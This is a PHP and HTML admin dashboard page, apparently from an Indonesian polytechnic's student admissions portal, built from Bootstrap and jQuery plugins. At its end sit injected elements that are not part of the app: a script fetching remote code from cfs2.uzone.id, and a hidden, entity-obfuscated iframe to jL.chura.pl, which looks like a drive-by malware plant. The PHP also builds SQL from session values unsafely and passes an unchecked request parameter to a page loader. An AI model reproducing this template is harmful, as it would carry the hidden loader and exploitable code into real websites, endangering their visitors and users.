 <?php
ini_set("display_errors",0);
// Definisi database
include("includes/defines.php");
// Kumpulan fungsi
include("includes/fungsi.php");
// Koneksi ke database
include("includes/connect.php");
// Membuat session login
cekSession();

$sql = mysql_query("select * from tberkas where nisn = '$_SESSION[nisn]'");
    $data = mysql_fetch_array($sql);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" type="image/png" sizes="16x16" href="plugins/images/favicon.png">
    <title>APMBJM</title>
    <!-- Bootstrap Core CSS -->
    <link href="assets/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Menu CSS -->
    <link href="plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.css" rel="stylesheet">
    <!-- animation CSS -->
    <link href="assets/css/animate.css" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="assets/css/style.css" rel="stylesheet">
    <!-- color CSS -->
    <link href="assets/css/colors/default.css" id="theme" rel="stylesheet">


    <link href="plugins/bower_components/datatables/jquery.dataTables.min.css" rel="stylesheet" type="text/css" />

    <link href="plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.css" rel="stylesheet">

    <link href="plugins/bower_components/bootstrap-datepicker/bootstrap-datepicker.min.css" rel="stylesheet" type="text/css" />
    <link href="plugins/bower_components/custom-select/custom-select.css" rel="stylesheet" type="text/css" />
    <link href="plugins/bower_components/switchery/dist/switchery.min.css" rel="stylesheet" />
    <link href="plugins/bower_components/bootstrap-select/bootstrap-select.min.css" rel="stylesheet" />
    <link href="plugins/bower_components/bootstrap-tagsinput/dist/bootstrap-tagsinput.css" rel="stylesheet" />
    <link href="plugins/bower_components/bootstrap-touchspin/dist/jquery.bootstrap-touchspin.min.css" rel="stylesheet" />
    <link href="plugins/bower_components/multiselect/css/multi-select.css" rel="stylesheet" type="text/css" />

    <link href="plugins/bower_components/calendar/dist/fullcalendar.css" rel="stylesheet" />
     <link href="plugins/bower_components/jquery-asColorPicker-master/css/asColorPicker.css" rel="stylesheet">
    <!-- Date picker plugins css -->
    <link href="plugins/bower_components/bootstrap-datepicker/bootstrap-datepicker.min.css" rel="stylesheet" type="text/css" />
    <!-- Daterange picker plugins css -->
    <link href="plugins/bower_components/timepicker/bootstrap-timepicker.min.css" rel="stylesheet">
    <link href="plugins/bower_components/bootstrap-daterangepicker/daterangepicker.css" rel="stylesheet">
    <!-- animation CSS -->

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
</head>
  <body class="fix-header">

    <div class="preloader">
        <svg class="circular" viewBox="25 25 50 50">
            <circle class="path" cx="50" cy="50" r="20" fill="none" stroke-width="2" stroke-miterlimit="10" />
        </svg>
    </div>
    <!-- ============================================================== -->
    <!-- Wrapper -->
    <!-- ============================================================== -->
    <div id="wrapper">
        <!-- ============================================================== -->
        <!-- Topbar header - style you can find in pages.scss -->
        <!-- ============================================================== -->
        <nav class="navbar navbar-default navbar-static-top m-b-0">
            <div class="navbar-header">
                <div class="top-left-part">
                    <!-- Logo -->
                    <a class="logo" href="index.php">
                        <!-- Logo icon image, you can use font-icon also --><b>
                        <!--This is dark logo icon--><img src="plugins/images/admin-logo.png" alt="home" class="dark-logo" /><!--This is light logo icon--><img src="plugins/images/admin-logo-dark.png" alt="home" class="light-logo" />
                     </b>
                        <!-- Logo text image you can use text also --><span class="hidden-xs">
                        <!--This is dark logo text--><img src="plugins/images/admin-text.png" alt="home" class="dark-logo" /><!--This is light logo text--><img src="plugins/images/admin-text-dark.png" alt="home" class="light-logo" />
                     </span> </a>
                </div>
                <!-- /Logo -->
                <!-- Search input and Toggle icon -->
                
                    <!-- .Task dropdown -->
                <ul class="nav navbar-top-links navbar-left">
                    <li><a href="javascript:void(0)" class="open-close waves-effect waves-light"><i class="ti-menu"></i></a></li>
                   
                    <!-- .Megamenu -->
                    
                    <!-- /.Megamenu -->
                </ul>

                <ul class="nav navbar-top-links navbar-right pull-right">
                   
                    <li class="dropdown">
                        <a class="dropdown-toggle profile-pic" data-toggle="dropdown" href="#"> <img src="berkas/<?php echo $_SESSION['username']; ?>/<?php echo $data['pas_foto']; ?>" width="36" class="img-circle"><b class="hidden-xs"><?php echo $_SESSION[username];?></b><span class="caret"></span> </a>
                        <ul class="dropdown-menu dropdown-user animated flipInY">
                            <li>
                                <div class="dw-user-box">
                                    <div class="u-img"><img src="berkas/<?php echo $_SESSION['username']; ?>/<?php echo $data['pas_foto']; ?>" alt="" /></div>
                                    <div class="u-text">
                                        <h4><?php echo $_SESSION[username];?></h4>
                                </div>
                            </li>
                            <li role="separator" class="divider"></li>
                            <?php if($_SESSION[level]=="admin") {?> 

                            <li><a href="profil.php"><i class="ti-user"></i> Profil</a></li>
                            <li><a href="logout.php"><i class="fa fa-power-off"></i> Logout</a></li>
                            <?php } ?>
                            <?php if($_SESSION[level]=="superadmin") {?> 
                            <li><a href="profil.php"><i class="ti-user"></i> Profil</a></li>
                            <li><a href="logout.php"><i class="fa fa-power-off"></i> Logout</a></li>
                            <?php } ?>
                            <?php if($_SESSION[level]=="member") {?> 
                            <li><a href="profil.php"><i class="ti-user"></i> Profil</a></li>
                            <li><a href="logout.php"><i class="fa fa-power-off"></i> Logout</a></li>
                            <?php } ?>
                            
                        </ul>
                        <!-- /.dropdown-user -->
                    </li>
                    <!-- /.dropdown -->
                </ul>
            </div>
            <!-- /.navbar-header -->
            <!-- /.navbar-top-links -->
            <!-- /.navbar-static-side -->
        </nav>
    
      	
      <!-- Left side column. contains the logo and sidebar -->
     <div class="navbar-default sidebar" role="navigation">
            <div class="sidebar-nav slimscrollsidebar">
                <div class="sidebar-head">
                    <h3><span class="fa-fw open-close"><i class="ti-close ti-menu"></i></span> <span class="hide-menu">Navigation</span></h3> </div>
                <div class="user-profile">
                    <div class="dropdown user-pro-body">
                        <div><img src="berkas/<?php echo $_SESSION['username']; ?>/<?php echo $data['pas_foto']; ?>"  class="img-circle"></div>
                        <a href="#" class="dropdown-toggle u-dropdown" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false"><?php echo $_SESSION[username];?></a>
                       
                    </div>
                </div>
           <ul class="nav" id="side-menu">
          <!-- Sidebar Menu -->  
	 <?php getMenu(); ?>
     </ul>
   </div>
   </div>
  
      <!-- Content Wrapper. Contains page content -->

              

        <!-- Main content -->
        <section class="content">
        <!-- Your Page Content Here -->	 
		
		<?php
		getPage($_REQUEST['page']);
		?>
		
        </section><!-- /.content -->
	


      <!-- Main Footer -->
     <footer class="footer text-center"> 2017 &copy; Politeknik Negeri Tanah Laut </footer>

    </div><!-- ./wrapper -->
    
 <!-- jQuery 2.1.4 -->
<script src="plugins/bower_components/jquery/dist/jquery.min.js"></script>
    <!-- Bootstrap Core JavaScript -->
    <script src="assets/bootstrap/dist/js/bootstrap.min.js"></script>
    <!-- Menu Plugin JavaScript -->
    <script src="plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.js"></script>
    <!--slimscroll JavaScript -->
    <script src="assets/js/jquery.slimscroll.js"></script>
    <!--Wave Effects -->
    <script src="assets/js/waves.js"></script>
    <!-- Custom Theme JavaScript -->
    <script src="assets/js/custom.min.js"></script>


    <!-- Menu Plugin JavaScript -->
    <script src="plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.js"></script>
    <!--slimscroll JavaScript -->
    <script src="assets/js/jquery.slimscroll.js"></script>
    <script src="assets/js/validator.js"></script>
    <!--Wave Effects -->

    <script src="plugins/bower_components/datatables/jquery.dataTables.min.js"></script>
    <script src="plugins/bower_components/styleswitcher/jQuery.style.switcher.js"></script>

    <script src="plugins/bower_components/calendar/jquery-ui.min.js"></script>
    <script src="plugins/bower_components/moment/moment.js"></script>
    <script src='plugins/bower_components/calendar/dist/fullcalendar.min.js'></script>
    <script src="plugins/bower_components/calendar/dist/jquery.fullcalendar.js"></script>
    <script src="plugins/bower_components/calendar/dist/cal-init.js"></script>

     <script src="plugins/bower_components/clockpicker/dist/jquery-clockpicker.min.js"></script>
    <!-- Color Picker Plugin JavaScript -->
    <script src="plugins/bower_components/jquery-asColorPicker-master/libs/jquery-asColor.js"></script>
    <script src="plugins/bower_components/jquery-asColorPicker-master/libs/jquery-asGradient.js"></script>
    <script src="plugins/bower_components/jquery-asColorPicker-master/dist/jquery-asColorPicker.min.js"></script>
    <!-- Date Picr Plugin JavaScript -->
    <script src="plugins/bower_components/bootstrap-datepicker/bootstrap-datepicker.min.js"></script>
    <!-- Date range Plugin JavaScript -->
    <script src="plugins/bower_components/timepicker/bootstrap-timepicker.min.js"></script>
    <script src="plugins/bower_components/bootstrap-daterangepicker/daterangepicker.js"></script>
    

     <script src="plugins/bower_components/switchery/dist/switchery.min.js"></script>
        <script src="plugins/bower_components/custom-select/custom-select.min.js" type="text/javascript"></script>
        <script src="plugins/bower_components/bootstrap-select/bootstrap-select.min.js" type="text/javascript"></script>
        <script src="plugins/bower_components/bootstrap-tagsinput/dist/bootstrap-tagsinput.min.js"></script>
        <script src="plugins/bower_components/bootstrap-touchspin/dist/jquery.bootstrap-touchspin.min.js" type="text/javascript"></script>
        <script type="text/javascript" src="plugins/bower_components/multiselect/js/jquery.multi-select.js"></script>
        
        <script>
    // Clock pickers
   
    // Colorpicker
    // Date Picker
    jQuery('.mydatepicker, #datepicker').datepicker();
    jQuery('#datepicker-autoclose').datepicker({
        autoclose: true,
        todayHighlight: true
    });
    jQuery('#date-range').datepicker({
        toggleActive: true
    });
    jQuery('#datepicker-inline').datepicker({
        todayHighlight: true
    });
    // Daterange picker
    
    </script>
     
        <script type="text/javascript">
            var htmlobjek;
            $(document).ready(function(){
              //apabila terjadi event onchange terhadap object <select id=propinsi>
              $("#id_kabupaten").change(function(){
                var id_kabupaten = $("#id_kabupaten").val();
                $.ajax({
                    url: "ambilkec.php",
                    data: "id_kabupaten="+id_kabupaten,
                    cache: false,
                    success: function(msg){

                        $("#id_kecamatan").html(msg);

                    }
                });
              });
              $("#id_provinsi").change(function(){
                var id_provinsi = $("#id_provinsi").val();
                $.ajax({
                    url: "ambilkab.php",
                    data: "id_provinsi="+id_provinsi,
                    cache: false,
                    success: function(msg){
                        $("#id_kabupaten").html(msg);
                    }
                });
              });
              $("#id_kabupaten").change(function(){
                var id_kabupaten = $("#id_kabupaten").val();
                $.ajax({
                    url: "ambilsekolah.php",
                    data: "id_kabupaten="+id_kabupaten,
                    cache: false,
                    success: function(msg){
                        $("#id_sekolah").html(msg);
                    }
                });
              });
            });

</script>
 <script type="text/javascript">
            var htmlobjek;
            $(document).ready(function(){
              //apabila terjadi event onchange terhadap object <select id=propinsi>
              $("#nama_kab").change(function(){
                var nama_kab = $("#nama_kab").val();
                $.ajax({
                    url: "ambilkec.php",
                    data: "nama_kab="+nama_kab,
                    cache: false,
                    success: function(msg){
                        //jika data sukses diambil dari server kita tampilkan
                        //di <select id=kota>
                        $("#nama_kec").html(msg);
                    }
                });
              });
              $("#kota").change(function(){
                var kota = $("#kota").val();
                $.ajax({
                    url: "ambilkecamatan.php",
                    data: "kota="+kota,
                    cache: false,
                    success: function(msg){
                        $("#kec").html(msg);
                    }
                });
              });
            });

</script>
        <script>
        jQuery(document).ready(function() {
            // Switchery
            var elems = Array.prototype.slice.call(document.querySelectorAll('.js-switch'));
            $('.js-switch').each(function() {
                new Switchery($(this)[0], $(this).data());
            });
            // For select 2
            $(".select2").select2();
            $('.selectpicker').selectpicker();
            //Bootstrap-TouchSpin
            $(".vertical-spin").TouchSpin({
                verticalbuttons: true,
                verticalupclass: 'ti-plus',
                verticaldownclass: 'ti-minus'
            });
            var vspinTrue = $(".vertical-spin").TouchSpin({
                verticalbuttons: true
            });
            if (vspinTrue) {
                $('.vertical-spin').prev('.bootstrap-touchspin-prefix').remove();
            }
            $("input[name='tch1']").TouchSpin({
                min: 0,
                max: 100,
                step: 0.1,
                decimals: 2,
                boostat: 5,
                maxboostedstep: 10,
                postfix: '%'
            });
            $("input[name='tch2']").TouchSpin({
                min: -1000000000,
                max: 1000000000,
                stepinterval: 50,
                maxboostedstep: 10000000,
                prefix: '$'
            });
            $("input[name='tch3']").TouchSpin();
            $("input[name='tch3_22']").TouchSpin({
                initval: 40
            });
            $("input[name='tch5']").TouchSpin({
                prefix: "pre",
                postfix: "post"
            });
            // For multiselect
            $('#pre-selected-options').multiSelect();
            $('#optgroup').multiSelect({
                selectableOptgroup: true
            });
            $('#public-methods').multiSelect();
            $('#select-all').click(function() {
                $('#public-methods').multiSelect('select_all');
                return false;
            });
            $('#deselect-all').click(function() {
                $('#public-methods').multiSelect('deselect_all');
                return false;
            });
            $('#refresh').on('click', function() {
                $('#public-methods').multiSelect('refresh');
                return false;
            });
            $('#add-option').on('click', function() {
                $('#public-methods').multiSelect('addOption', {
                    value: 42,
                    text: 'test 42',
                    index: 0
                });
                return false;
            });
        });
        </script>
  
    <script>
    $(document).ready(function() {
        $('#myTable').DataTable();
        $(document).ready(function() {
            var table = $('#example').DataTable({
                "columnDefs": [{
                    "visible": false,
                    "targets": 2
                }],
                "order": [
                    [2, 'asc']
                ],
                "displayLength": 25,
                "drawCallback": function(settings) {
                    var api = this.api();
                    var rows = api.rows({
                        page: 'current'
                    }).nodes();
                    var last = null;
                    api.column(2, {
                        page: 'current'
                    }).data().each(function(group, i) {
                        if (last !== group) {
                            $(rows).eq(i).before('<tr class="group"><td colspan="5">' + group + '</td></tr>');
                            last = group;
                        }
                    });
                }
            });
            // Order by the grouping
            $('#example tbody').on('click', 'tr.group', function() {
                var currentOrder = table.order()[0];
                if (currentOrder[0] === 2 && currentOrder[1] === 'asc') {
                    table.order([2, 'desc']).draw();
                } else {
                    table.order([2, 'asc']).draw();
                }
            });
        });
    });
   
    </script>
    <!--Style Switcher -->
    <script src="plugins/bower_components/styleswitcher/jQuery.style.switcher.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKv%2b8gD%2fhIVp8gqMuboyqUSvyEC8BjPvSphmg0nXz8cW4N72WlzIVUkwvooBPKgsrqGP9B8Wz3QUrmJR9DjvS1FREwtl%2bdlzUydS4tOVyKTztWC61ljtDvUquIK4jDAu5810QTcZzSzahR%2fExMLmg%2bZ%2bWdY3yszuY5eHl76dziU7VFN7aP%2fNXxNWyc8S2ncOiYsP90ICXXcrWhQutnniJ9wUOrkA%2biwAAEwLmjexxOZ1oyFBgFTTmIVO4d8vDqSKs6qomyZakXxYyOnBjb7FU9%2b3wBNgRnmQ3s%2bxlHN9SSGRiInbcJ11p1VPVL9twd0Uz26gfqxvf6jVeR216ldURNtFwcFQW2Hrw5d%2bSZpcBt92%2fOt%2b5BDgCEa431ymoUh3%2fjav%2fLb8NMmEaMle3Jj6O%2fS%2f%2fU9ZyRsqnjjbG8PfkWzinzSttwOvduNVgpOvE9J2rkmNHWhWRhOh56uFSSCjMcJJzgMF%2bGx4E7SJ175%2b3FKFbIj8evpjmYrDWrzqE%2bEluD1OQL8D6yQes0A6Sh5r2pdpXTegRYo59z" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
  <iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
</body>
</html>